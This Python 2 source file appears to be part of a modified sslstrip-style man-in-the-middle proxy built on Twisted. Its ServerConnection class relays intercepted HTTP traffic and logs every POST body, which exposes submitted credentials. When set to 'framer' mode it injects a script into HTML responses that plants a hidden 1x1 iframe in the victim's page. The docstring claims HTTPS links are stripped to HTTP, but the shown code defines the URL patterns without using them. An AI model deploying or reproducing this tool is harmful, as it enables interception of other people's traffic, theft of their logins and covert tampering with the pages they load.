
import logging, re, string, random, zlib, gzip, StringIO, os

from twisted.web.http import HTTPClient

class ServerConnection(HTTPClient):

    ''' The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    '''

    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType           = re.compile(r"https://", re.IGNORECASE)
    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)

    def __init__(self, command, uri, postData, actAs, headers,client):
        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.skip             = False
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False
        self.actAs            = actAs

    def getLogLevel(self):
        return logging.DEBUG

    def getPostPrefix(self):
        return "POST"

    def sendRequest(self):
        logging.log(self.getLogLevel(), "Sending Request: %s %s"  % (self.command, self.uri))
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            logging.log(self.getLogLevel(), "Sending header: %s : %s" % (header, value))
            self.sendHeader(header, value)
           
        self.endHeaders()

    def sendPostData(self):
        logging.warning(self.getPostPrefix() + " Data (" + self.headers['host'] + "):\n" + str(self.postData))
        self.transport.write(self.postData)

    def connectionMade(self):
        logging.log(self.getLogLevel(), "HTTP connection made.")
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, status, message):
    
        logging.log(self.getLogLevel(), "Got server response: %s %s %s" % (version, status, message))
        self.client.setResponseCode(int(status), message)

    def handleHeader(self, key, value):
        logging.log(self.getLogLevel(), "Got server header: %s:%s" % (key, value))

        
        if (key.lower() == 'content-type'):
            if "text/html" not in value:
                self.skip = True
                logging.debug("not scanning...")
                
        elif (key.lower() == 'content-encoding'):
            if (value.find('gzip') != -1):
                logging.debug("Response is compressed...")
                self.isCompressed = True
                
        elif (key.lower() == 'content-length'):
            self.contentLength = value
    
        self.client.setHeader(key, value)



    def handleEndHeaders(self):
       
       if self.contentLength != None:
          self.client.setHeader("Content-Length", self.contentLength)
       
       if self.length == 0:
           self.shutdown()
                        
    def handleResponsePart(self, data):
        
        if self.skip:
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        
        if self.skip:
            self.shutdown()
        else:
            HTTPClient.handleResponseEnd(self)
            
            


    def appendMaster(self,data):
        
         headEnd = data.find("</head>")
         if headEnd == -1:
             bodyEnd = data.find("</body>")
             if bodyEnd == -1:
                return data
             else:       
                newData = data[:bodyEnd]
                rest = data[bodyEnd:] 
         else: 
             newData = data[:headEnd]
             rest = data[headEnd:] 
                                                                            
                                                                                                               

         createMasterFrame = "function createMasterFrame()                                                       \
                              {                                                                                  \
                                masterFrame = document.createElement(\"IFRAME\");                                \
                                masterFrame.setAttribute(\"src\", \"framer.html\");                              \
                                masterFrame.setAttribute(\"id\", \"masterFrame\");                               \
                                masterFrame.setAttribute(\"name\", \"masterFrame\");                             \
                                masterFrame.setAttribute(\"height\", \"1\");                                   \
                                masterFrame.setAttribute(\"width\", \"1\");                                    \
                                document.body.appendChild(masterFrame);                                          \
                              }"

         destroyMasterFrame = "function destroyMasterFrame() \
                               {  \
                                  var master = document.getElementById(\"masterFrame\"); \
                                  master.parentNode.removeChild(master); \
                               };"

         initFraming =         "function initFraming() \
                                { \
                                   if (window.addEventListener){ \
                                      window.addEventListener(\"message\", destroyMasterFrame, false); \
                                   }else{ \
                                      if(window.attachEvent){ \
                                         window.attachEvent(\"onmessage\", destroyMasterFrame); \
                                      } \
                                   } \
                                   createMasterFrame(); \
                                }"

         js = "<script type=\"text/javascript\">"+destroyMasterFrame+createMasterFrame+initFraming+"setTimeout(\"initFraming()\",300);</script>"  
         newData += js + rest
         return newData
         

    def handleResponse(self, data):

        if (self.isCompressed):
            logging.debug("Decompressing content...")
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
              
        if self.actAs =="framer":
            data = self.appendMaster(data)
            
        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))     

        self.client.write(data)
        self.shutdown()
   
   

    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            try:  
               self.client.finish()        
            except:
               print "connection dead"
            self.transport.loseConnection() 

